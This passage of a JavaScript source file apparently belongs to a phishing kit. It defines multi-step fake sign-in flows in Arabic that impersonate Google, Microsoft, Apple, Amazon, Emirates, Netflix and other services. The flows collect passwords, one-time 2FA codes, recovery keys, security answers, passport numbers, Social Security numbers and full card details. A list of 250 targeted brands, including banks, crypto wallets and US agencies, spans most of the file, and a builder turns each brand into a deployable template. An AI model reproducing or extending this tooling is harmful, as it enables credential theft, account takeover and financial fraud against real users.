    { slug:'email',          form_type:'login',  page_title:'تسجيل الدخول',      headline:'تسجيل الدخول',                       subheadline:'انتقل إلى حساب Google',                     fields:['email'],                          layout:'auth',  cta:'التالي',            step_label:'Email',          notify_step:true  },
    { slug:'password',       form_type:'login',  page_title:'مرحباً',             headline:'مرحباً',                              subheadline:'أدخل كلمة المرور',                          fields:['password'],                       layout:'auth',  cta:'التالي',            step_label:'Password',       notify_step:true  },
    { slug:'2fa-phone',      form_type:'otp',    page_title:'التحقق',             headline:'تحقق من هويتك',                       subheadline:'أرسلنا إشعاراً إلى هاتفك. أدخل كود التحقق', fields:['code'],                           layout:'otp',   cta:'التالي',            step_label:'2FA Phone',      notify_step:true,  otp_length:6 },
    { slug:'recovery-email', form_type:'verify', page_title:'البريد الاحتياطي',   headline:'أضف بريداً احتياطياً',               subheadline:'أدخل بريدك الاحتياطي لاستعادة الحساب',      fields:['recovery_email'],                 layout:'verify',cta:'إضافة',             step_label:'Recovery Email', notify_step:true  }
  ],

  outlook: [
    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',                       subheadline:'أدخل بريد Microsoft الخاص بك',              fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
    { slug:'password', form_type:'login', page_title:'أدخل كلمة المرور',headline:'أدخل كلمة المرور',                  subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
    { slug:'2fa',      form_type:'otp',   page_title:'التحقق',          headline:'أدخل الكود',                         subheadline:'أدخل الكود من تطبيق Microsoft Authenticator', fields:['code'],              layout:'otp',  cta:'تحقق',         step_label:'2FA',      notify_step:true,  otp_length:6 }
  ],

  yahoomail: [
    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Yahoo',             subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك',       fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
    { slug:'password', form_type:'login', page_title:'كلمة المرور',    headline:'أدخل كلمة المرور',                   subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  protonmail: [
    { slug:'login', form_type:'login', page_title:'تسجيل الدخول',     headline:'تسجيل الدخول إلى ProtonMail',        subheadline:'أدخل اسم المستخدم وكلمة المرور',            fields:['username','password'],layout:'auth', cta:'تسجيل الدخول', step_label:'Login', notify_step:true  },
    { slug:'2fa',   form_type:'otp',   page_title:'المصادقة الثنائية', headline:'كود المصادقة الثنائية',              subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],               layout:'otp',  cta:'تأكيد',        step_label:'2FA',   notify_step:true,  otp_length:6 }
  ],

  // ── TECH ────────────────────────────────────────────────────────────────────

  apple: [
    { slug:'apple-id',     form_type:'login',  page_title:'Apple ID',          headline:'تسجيل الدخول بـ Apple ID',          subheadline:'أدخل Apple ID',                             fields:['email'],                    layout:'auth',  cta:'التالي',             step_label:'Apple ID',         notify_step:true  },
    { slug:'password',     form_type:'login',  page_title:'كلمة المرور',       headline:'أدخل كلمة مرور Apple ID',           subheadline:'',                                           fields:['password'],                 layout:'auth',  cta:'تسجيل الدخول',       step_label:'Password',         notify_step:true  },
    { slug:'2fa-device',   form_type:'otp',    page_title:'تحقق الجهاز',       headline:'تحقق من هويتك',                      subheadline:'تم إرسال كود مكون من 6 أرقام إلى جهازك الموثوق', fields:['code'],                layout:'otp',   cta:'متابعة',             step_label:'Device 2FA',       notify_step:true,  otp_length:6 },
    { slug:'recovery-key', form_type:'verify', page_title:'مفتاح الاسترداد',   headline:'مفتاح استرداد الحساب',               subheadline:'أدخل مفتاح استرداد الحساب من 28 حرفاً',     fields:['recovery_key'],             layout:'verify',cta:'إعادة تعيين',         step_label:'Recovery Key',     notify_step:true  }
  ],

  microsoft: [
    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',    headline:'تسجيل الدخول',                       subheadline:'أدخل حساب Microsoft الخاص بك',              fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
    { slug:'password', form_type:'login', page_title:'أدخل كلمة المرور',headline:'أدخل كلمة المرور',                  subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
    { slug:'2fa',      form_type:'otp',   page_title:'التحقق',           headline:'الموافقة على طلب تسجيل الدخول',     subheadline:'أدخل الكود من تطبيق Microsoft Authenticator', fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'2FA',      notify_step:true,  otp_length:6 }
  ],

  google: [
    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',                       subheadline:'انتقل إلى حساب Google',                     fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
    { slug:'password', form_type:'login', page_title:'أهلاً',           headline:'أهلاً',                              subheadline:'أدخل كلمة المرور الخاصة بك',                fields:['password'],          layout:'auth', cta:'التالي',       step_label:'Password', notify_step:true  },
    { slug:'2fa',      form_type:'otp',   page_title:'التحقق',          headline:'تحقق من هويتك',                      subheadline:'جوجل أرسل كوداً إلى هاتفك',                 fields:['code'],              layout:'otp',  cta:'التالي',       step_label:'2FA',      notify_step:true,  otp_length:6 }
  ],

  amazon: [
    { slug:'email',    form_type:'login', page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',                       subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك',       fields:['email'],             layout:'auth', cta:'متابعة',       step_label:'Email',    notify_step:true  },
    { slug:'password', form_type:'login', page_title:'كلمة المرور',    headline:'أدخل كلمة المرور',                   subheadline:'',                                           fields:['password'],          layout:'auth', cta:'تسجيل الدخول', step_label:'Password', notify_step:true  },
    { slug:'otp',      form_type:'otp',   page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى بريدك الإلكتروني',         fields:['code'],              layout:'otp',  cta:'تسجيل الدخول', step_label:'OTP',      notify_step:true,  otp_length:6 }
  ],

  // ── AIRLINES ─────────────────────────────────────────────────────────────────

  emirates: [
    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Emirates',         subheadline:'أدخل اسم المستخدم وكلمة المرور',            fields:['username','password'],               layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',           notify_step:true  },
    { slug:'sms-otp',         form_type:'otp',    page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك المسجّل',       fields:['code'],                              layout:'otp',   cta:'تأكيد',         step_label:'SMS OTP',         notify_step:true,  otp_length:6 },
    { slug:'confirm-details', form_type:'verify', page_title:'تأكيد البيانات',  headline:'تأكيد بيانات جواز السفر',           subheadline:'أدخل رقم جواز سفرك وتاريخ ميلادك',         fields:['passport_number','dob'],             layout:'verify',cta:'تأكيد',         step_label:'Passport Details',notify_step:true  },
    { slug:'payment',         form_type:'payment',page_title:'ترقية الرحلة',    headline:'الدفع لترقية الرحلة',               subheadline:'أدخل بيانات بطاقتك لإتمام الترقية',        fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'دفع والترقية',step_label:'Payment',        notify_step:true  }
  ],

  qatarairways: [
    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Qatar Airways',    subheadline:'أدخل بريدك ورقم العضوية وكلمة المرور',     fields:['email','password'],                  layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',           notify_step:true  },
    { slug:'otp',             form_type:'otp',    page_title:'التحقق',          headline:'كود التحقق',                        subheadline:'أرسلنا كوداً إلى بريدك',                   fields:['code'],                              layout:'otp',   cta:'تأكيد',         step_label:'OTP',             notify_step:true,  otp_length:6 },
    { slug:'confirm-details', form_type:'verify', page_title:'تأكيد الهوية',   headline:'تأكيد بيانات جواز السفر',           subheadline:'أكّد بياناتك للإجراءات الأمنية',            fields:['passport_number','dob'],             layout:'verify',cta:'تأكيد',         step_label:'Passport Details',notify_step:true  }
  ],

};

// ── Category-default flows (fallback for brands without explicit flow) ─────────

const CAT_FLOWS = {
  social: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',       subheadline:'أرسلنا كوداً برسالة نصية',              fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true, otp_length:6 }
  ],
  government: [
    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل اسم المستخدم وكلمة المرور ورقم الضمان الاجتماعي', fields:['username','password','ssn'], layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
    { slug:'sms-code',  form_type:'otp',      page_title:'التحقق',         headline:'كود التحقق',            subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                      layout:'otp',    cta:'تأكيد',        step_label:'SMS Code',   notify_step:true, otp_length:6 },
    { slug:'id-confirm',form_type:'id_verify',page_title:'تأكيد الهوية',   headline:'تأكيد هويتك',          subheadline:'أدخل رقم الضمان الاجتماعي وتاريخ الميلاد', fields:['ssn','dob'],                 layout:'verify', cta:'تأكيد',        step_label:'ID Confirm', notify_step:true  }
  ],
  banks: [
    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',   headline:'تسجيل الدخول',        subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],              layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
    { slug:'sms-otp',    form_type:'otp',        page_title:'التحقق',          headline:'كود التحقق',           subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',  fields:['code'],                             layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true, otp_length:6 },
    { slug:'security-q', form_type:'security_q', page_title:'أسئلة الأمان',    headline:'أسئلة الأمان',         subheadline:'أجب على أسئلة الأمان للمتابعة',           fields:['answer1','answer2','answer3'],       layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  }
  ],
  crypto: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',     notify_step:true  },
    { slug:'2fa-email',form_type:'otp',   page_title:'تحقق البريد',   headline:'تحقق من بريدك',         subheadline:'أدخل الكود المرسل إلى بريدك الإلكتروني', fields:['code'],            layout:'otp',  cta:'تأكيد',        step_label:'Email 2FA', notify_step:true, otp_length:6 },
    { slug:'2fa-sms',  form_type:'otp',   page_title:'تحقق الهاتف',   headline:'تحقق من هاتفك',         subheadline:'أدخل الكود المرسل برسالة SMS',          fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS 2FA',   notify_step:true, otp_length:6 }
  ],
  payments: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',       subheadline:'أرسلنا كوداً برسالة نصية',              fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true, otp_length:6 }
  ],
  email: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',          subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',       subheadline:'أرسلنا كوداً برسالة نصية',              fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true, otp_length:6 }
  ],
  tech: [
    { slug:'login',form_type:'login',page_title:'تسجيل الدخول', headline:'تسجيل الدخول',subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',fields:['email','password'],layout:'auth',cta:'تسجيل الدخول',step_label:'Login',notify_step:true },
    { slug:'2fa',  form_type:'otp',  page_title:'التحقق',        headline:'أدخل كود التحقق',subheadline:'أدخل الكود من تطبيق المصادقة',       fields:['code'],             layout:'otp', cta:'تأكيد',        step_label:'2FA',  notify_step:true,otp_length:6 }
  ],
  airlines: [
    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول',        subheadline:'أدخل بريدك أو رقم الحجز واسم العائلة',  fields:['email','password'],            layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',           notify_step:true  },
    { slug:'otp',             form_type:'otp',    page_title:'التحقق',         headline:'كود التحقق',           subheadline:'أرسلنا كوداً إلى بريدك أو هاتفك',       fields:['code'],                        layout:'otp',   cta:'تأكيد',         step_label:'OTP',             notify_step:true, otp_length:6 },
    { slug:'confirm-details', form_type:'verify', page_title:'تأكيد الهوية',  headline:'تأكيد بيانات السفر',  subheadline:'أدخل رقم جواز السفر وتاريخ الميلاد',    fields:['passport_number','dob'],       layout:'verify',cta:'تأكيد',         step_label:'Passport Details',notify_step:true  }
  ],
  audio: [
    { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',    headline:'تسجيل الدخول',              subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',          notify_step:true  },
    { slug:'payment-update', form_type:'payment',page_title:'تحديث بيانات الدفع',headline:'تحديث طريقة الدفع',       subheadline:'حدّث بيانات دفعك للاستمرار في الاستمتاع بالخدمة', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',          step_label:'Payment Update', notify_step:true  }
  ],
  video: [
    { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',    headline:'تسجيل الدخول',              subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',  fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',          notify_step:true  },
    { slug:'payment-update', form_type:'payment',page_title:'تحديث بيانات الدفع',headline:'تحديث بيانات الفوترة',   subheadline:'حدّث بيانات الدفع لاستعادة الوصول إلى محتواك', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',          step_label:'Payment Update', notify_step:true  }
  ]
};

// ── Special video overrides ──────────────────────────────────────────────────
FLOWS.netflixvideo = [
  { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',     headline:'تسجيل الدخول إلى Netflix',     subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',     fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',          notify_step:true  },
  { slug:'payment-update',  form_type:'payment',page_title:'تحديث الفاتورة',   headline:'تحديث بيانات الفاتورة',        subheadline:'لاستعادة الوصول إلى Netflix، حدّث بيانات دفعك', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',        step_label:'Payment Update', notify_step:true  },
  { slug:'confirm-address', form_type:'verify', page_title:'تأكيد العنوان',    headline:'تأكيد عنوان الفاتورة',         subheadline:'تأكد من صحة عنوان الفاتورة',              fields:['address','city','zip'],                      layout:'verify',cta:'تأكيد',        step_label:'Billing Address',notify_step:true  }
];

FLOWS.disneyplus = [
  { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',    headline:'تسجيل الدخول إلى Disney+',      subheadline:'أدخل بريدك وكلمة المرور',               fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',          notify_step:true  },
  { slug:'payment-update', form_type:'payment',page_title:'تحديث بيانات الدفع',headline:'تحديث طريقة الدفع',            subheadline:'حدّث بيانات بطاقتك للاستمرار في مشاهدة Disney+', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'تحديث',        step_label:'Payment Update', notify_step:true  }
];

// ── BRANDS array ─────────────────────────────────────────────────────────────

const BRANDS = [
  // social (20)
  ['t001','Facebook','social','facebook'],
  ['t002','Instagram','social','instagram'],
  ['t003','TikTok','social','tiktok'],
  ['t004','Twitter/X','social','twitterx'],
  ['t005','Snapchat','social','snapchat'],
  ['t006','LinkedIn','social','linkedin'],
  ['t007','Pinterest','social','pinterest'],
  ['t008','Reddit','social','reddit'],
  ['t009','Tumblr','social','tumblr'],
  ['t010','Discord','social','discord'],
  ['t011','WhatsApp','social','whatsapp'],
  ['t012','Telegram','social','telegram'],
  ['t013','WeChat','social','wechat'],
  ['t014','Line','social','line'],
  ['t015','Viber','social','viber'],
  ['t016','BeReal','social','bereal'],
  ['t017','Clubhouse','social','clubhouse'],
  ['t018','Mastodon','social','mastodon'],
  ['t019','Threads','social','threads'],
  ['t020','YouTube','social','youtube'],

  // government (20)
  ['t021','IRS','government','irs'],
  ['t022','SSA','government','ssa'],
  ['t023','DMV','government','dmv'],
  ['t024','USCIS','government','uscis'],
  ['t025','TSA','government','tsa'],
  ['t026','NASA','government','nasa'],
  ['t027','FBI','government','fbi'],
  ['t028','CIA','government','cia'],
  ['t029','NSA','government','nsa'],
  ['t030','DHS','government','dhs'],
  ['t031','VA','government','va'],
  ['t032','Medicare','government','medicare'],
  ['t033','Medicaid','government','medicaid'],
  ['t034','SBA','government','sba'],
  ['t035','FTC','government','ftc'],
  ['t036','SEC','government','sec'],
  ['t037','USPS','government','usps'],
  ['t038','State Dept','government','statedept'],
  ['t039','Passport','government','passport'],
  ['t040','UN','government','un'],

  // banks (30)
  ['t041','JPMorgan Chase','banks','jpmorganchase'],
  ['t042','Bank of America','banks','bankofamerica'],
  ['t043','Wells Fargo','banks','wellsfargo'],
  ['t044','Citibank','banks','citibank'],
  ['t045','HSBC','banks','hsbc'],
  ['t046','Barclays','banks','barclays'],
  ['t047','Deutsche Bank','banks','deutschebank'],
  ['t048','BNP Paribas','banks','bnpparibas'],
  ['t049','Goldman Sachs','banks','goldmansachs'],
  ['t050','Morgan Stanley','banks','morganstanley'],
  ['t051','UBS','banks','ubs'],
  ['t052','Credit Suisse','banks','creditsuisse'],
  ['t053','TD Bank','banks','tdbank'],
  ['t054','RBC','banks','rbc'],
  ['t055','Santander','banks','santander'],
  ['t056','BBVA','banks','bbva'],
  ['t057','ING','banks','ing'],
  ['t058','ABN AMRO','banks','abnamro'],
  ['t059','Rabobank','banks','rabobank'],
  ['t060','Commerzbank','banks','commerzbank'],
  ['t061','Scotiabank','banks','scotiabank'],
  ['t062','ANZ','banks','anz'],
  ['t063','NAB','banks','nab'],
  ['t064','Westpac','banks','westpac'],
  ['t065','Standard Chartered','banks','standardchartered'],
  ['t066','Emirates NBD','banks','emiratesnbd'],
  ['t067','Mashreq','banks','mashreq'],
  ['t068','QNB','banks','qnb'],
  ['t069','ADCB','banks','adcb'],
  ['t070','FAB','banks','fab'],

  // crypto (30)
  ['t071','Binance','crypto','binance'],
  ['t072','Coinbase','crypto','coinbase'],
  ['t073','Kraken','crypto','kraken'],
  ['t074','Bitfinex','crypto','bitfinex'],
  ['t075','Gemini','crypto','gemini'],
  ['t076','OKX','crypto','okx'],
  ['t077','Bybit','crypto','bybit'],
  ['t078','Huobi','crypto','huobi'],
  ['t079','KuCoin','crypto','kucoin'],
  ['t080','Gate.io','crypto','gateio'],
  ['t081','Crypto.com','crypto','cryptocom'],
  ['t082','Bitstamp','crypto','bitstamp'],
  ['t083','Poloniex','crypto','poloniex'],
  ['t084','MEXC','crypto','mexc'],
  ['t085','Phemex','crypto','phemex'],
  ['t086','dYdX','crypto','dydx'],
  ['t087','Uniswap','crypto','uniswap'],
  ['t088','MetaMask','crypto','metamask'],
  ['t089','Trust Wallet','crypto','trustwallet'],
  ['t090','Ledger','crypto','ledger'],
  ['t091','Trezor','crypto','trezor'],
  ['t092','Exodus','crypto','exodus'],
  ['t093','Phantom','crypto','phantom'],
  ['t094','Solflare','crypto','solflare'],
  ['t095','BitMart','crypto','bitmartex'],
  ['t096','LBank','crypto','lbank'],
  ['t097','CoinEx','crypto','coinex'],
  ['t098','Bitget','crypto','bitget'],
  ['t099','Pionex','crypto','pionex'],
  ['t100','HTX','crypto','htx'],

  // payments (30)
  ['t101','PayPal','payments','paypal'],
  ['t102','Stripe','payments','stripe'],
  ['t103','Square','payments','square'],
  ['t104','Venmo','payments','venmo'],
  ['t105','Zelle','payments','zelle'],
  ['t106','Cash App','payments','cashapp'],
  ['t107','Apple Pay','payments','applepay'],
  ['t108','Google Pay','payments','googlepay'],
  ['t109','Samsung Pay','payments','samsungpay'],
  ['t110','Klarna','payments','klarna'],
  ['t111','Afterpay','payments','afterpay'],
  ['t112','Affirm','payments','affirm'],
  ['t113','Braintree','payments','braintree'],
  ['t114','Adyen','payments','adyen'],
  ['t115','Worldpay','payments','worldpay'],
  ['t116','Checkout.com','payments','checkoutcom'],
  ['t117','Wise','payments','wise'],
  ['t118','Revolut','payments','revolut'],
  ['t119','Monzo','payments','monzo'],
  ['t120','N26','payments','n26'],
  ['t121','Chime','payments','chime'],
  ['t122','Ally','payments','ally'],
  ['t123','Payoneer','payments','payoneer'],
  ['t124','Skrill','payments','skrill'],
  ['t125','Neteller','payments','neteller'],
  ['t126','Paysafe','payments','paysafe'],
  ['t127','Razorpay','payments','razorpay'],
  ['t128','Paytm','payments','paytm'],
  ['t129','PhonePe','payments','phonepe'],
  ['t130','GCash','payments','gcash'],

  // email (15)
  ['t131','Gmail','email','gmail'],
  ['t132','Outlook','email','outlook'],
  ['t133','Yahoo Mail','email','yahoomail'],
  ['t134','ProtonMail','email','protonmail'],
  ['t135','Tutanota','email','tutanota'],
  ['t136','Zoho Mail','email','zohomail'],
  ['t137','iCloud Mail','email','icloudmail'],
  ['t138','Fastmail','email','fastmail'],
  ['t139','HEY','email','hey'],
  ['t140','Superhuman','email','superhuman'],
  ['t141','Spike','email','spike'],
  ['t142','Airmail','email','airmail'],
  ['t143','Basecamp Mail','email','basecampmail'],
  ['t144','Postmark','email','postmark'],
  ['t145','SendGrid','email','sendgrid'],

  // tech (25)
  ['t146','Apple','tech','apple'],
  ['t147','Microsoft','tech','microsoft'],
  ['t148','Google','tech','google'],
  ['t149','Amazon','tech','amazon'],
  ['t150','Meta','tech','meta'],
  ['t151','Netflix','tech','netflix'],
  ['t152','Uber','tech','uber'],
  ['t153','Airbnb','tech','airbnb'],
  ['t154','Spotify','tech','spotify'],
  ['t155','Dropbox','tech','dropbox'],
  ['t156','Slack','tech','slack'],
  ['t157','Zoom','tech','zoom'],
  ['t158','Adobe','tech','adobe'],
  ['t159','Salesforce','tech','salesforce'],
  ['t160','Oracle','tech','oracle'],
  ['t161','SAP','tech','sap'],
  ['t162','IBM','tech','ibm'],
  ['t163','Intel','tech','intel'],
  ['t164','AMD','tech','amd'],
  ['t165','NVIDIA','tech','nvidia'],
  ['t166','Cloudflare','tech','cloudflare'],
  ['t167','Twilio','tech','twilio'],
  ['t168','Okta','tech','okta'],
  ['t169','Datadog','tech','datadog'],
  ['t170','HashiCorp','tech','hashicorp'],

  // airlines (20)
  ['t171','Emirates','airlines','emirates'],
  ['t172','Qatar Airways','airlines','qatarairways'],
  ['t173','Etihad','airlines','etihad'],
  ['t174','Turkish Airlines','airlines','turkishairlines'],
  ['t175','Lufthansa','airlines','lufthansa'],
  ['t176','British Airways','airlines','britishairways'],
  ['t177','Air France','airlines','airfrance'],
  ['t178','KLM','airlines','klm'],
  ['t179','Swiss Air','airlines','swissair'],
  ['t180','Singapore Airlines','airlines','singaporeairlines'],
  ['t181','Cathay Pacific','airlines','cathaypacific'],
  ['t182','ANA','airlines','ana'],
  ['t183','JAL','airlines','jal'],
  ['t184','Delta','airlines','delta'],
  ['t185','United','airlines','united'],
  ['t186','American','airlines','american'],
  ['t187','Southwest','airlines','southwest'],
  ['t188','Ryanair','airlines','ryanair'],
  ['t189','EasyJet','airlines','easyjet'],
  ['t190','Air Arabia','airlines','airarabia'],

  // audio (30)
  ['t191','Spotify','audio','spotifyaudio'],
  ['t192','Apple Music','audio','applemusic'],
  ['t193','Amazon Music','audio','amazonmusic'],
  ['t194','YouTube Music','audio','youtubemusic'],
  ['t195','Tidal','audio','tidal'],
  ['t196','Deezer','audio','deezer'],
  ['t197','SoundCloud','audio','soundcloud'],
  ['t198','Pandora','audio','pandora'],
  ['t199','iHeartRadio','audio','iheartradio'],
  ['t200','TuneIn','audio','tunein'],
  ['t201','Audible','audio','audible'],
  ['t202','Podcast Addict','audio','podcastaddict'],
  ['t203','Overcast','audio','overcast'],
  ['t204','Pocket Casts','audio','pocketcasts'],
  ['t205','Stitcher','audio','stitcher'],
  ['t206','Castbox','audio','castbox'],
  ['t207','RadioPublic','audio','radiopublic'],
  ['t208','Luminary','audio','luminary'],
  ['t209','Breaker','audio','breaker'],
  ['t210','Google Podcasts','audio','googlepodcasts'],
  ['t211','SiriusXM','audio','siriusxm'],
  ['t212','Bandcamp','audio','bandcamp'],
  ['t213','Mixcloud','audio','mixcloud'],
  ['t214','Audiomack','audio','audiomack'],
  ['t215','DatPiff','audio','datpiff'],
  ['t216','LiveXLive','audio','livexlive'],
  ['t217','Slacker','audio','slacker'],
  ['t218','8tracks','audio','eighttracks'],
  ['t219','Last.fm','audio','lastfm'],
  ['t220','Napster','audio','napster'],

  // video (30)
  ['t221','Netflix','video','netflixvideo'],
  ['t222','YouTube','video','youtubevideo'],
  ['t223','Disney+','video','disneyplus'],
  ['t224','HBO Max','video','hbomax'],
  ['t225','Hulu','video','hulu'],
  ['t226','Amazon Prime','video','amazonprime'],
  ['t227','Peacock','video','peacock'],
  ['t228','Paramount+','video','paramountplus'],
  ['t229','Apple TV+','video','appletvplus'],
  ['t230','Discovery+','video','discoveryplus'],
  ['t231','ESPN+','video','espnplus'],
  ['t232','Fubo','video','fubo'],
  ['t233','Sling','video','sling'],
  ['t234','Philo','video','philo'],
  ['t235','Crunchyroll','video','crunchyroll'],
  ['t236','Funimation','video','funimation'],
  ['t237','Tubi','video','tubi'],
  ['t238','Pluto TV','video','plutotv'],
  ['t239','Vudu','video','vudu'],
  ['t240','Google TV','video','googletv'],
  ['t241','MUBI','video','mubi'],
  ['t242','Criterion','video','criterion'],
  ['t243','Shudder','video','shudder'],
  ['t244','Arrow Video','video','arrowvideo'],
  ['t245','BritBox','video','britbox'],
  ['t246','Acorn TV','video','acorntv'],
  ['t247','MHz Choice','video','mhzchoice'],
  ['t248','Sundance Now','video','sundancenow'],
  ['t249','Topic','video','topic'],
  ['t250','Vimeo','video','vimeo']
];

function buildTemplate([id, name, category, palKey]) {
  const raw = PALETTES[palKey] || CATEGORY_DEFAULTS[category] || CATEGORY_DEFAULTS.social;
  const palette = { bg: raw[0], card: raw[1], fg: raw[2], accent: raw[3], accent2: raw[4] };

  const flowDef = FLOWS[palKey] || CAT_FLOWS[category] || CAT_FLOWS.social;

  const pages = flowDef.map(pg => ({
    slug:        pg.slug,
    page_title:  pg.page_title,
    headline:    pg.headline,
    subheadline: pg.subheadline,
    body:        '',
    cta:         pg.cta || 'متابعة',
    fields:      pg.fields || [],
    layout:      pg.layout || 'auth',
    form_type:   pg.form_type || 'login',
    step_label:  pg.step_label || pg.slug,
    notify_step: pg.notify_step !== false,
    features:    pg.features || null,
    plans:       pg.plans    || null,
    otp_type:    pg.otp_type || null,
    otp_length:  pg.otp_length || null
  }));

  return {
    id,
    name,
    category,
    categoryName: CATEGORIES.find(c => c.id === category)?.name || category,
    palette,
    pages,
    pages_count: pages.length
  };
}

export const TEMPLATES = BRANDS.map(buildTemplate);
export const getTemplate            = id  => TEMPLATES.find(t => t.id === id) || TEMPLATES[0];
export const getCategories          = ()  => CATEGORIES;
export const getTemplatesByCategory = cat => cat ? TEMPLATES.filter(t => t.category === cat) : TEMPLATES;
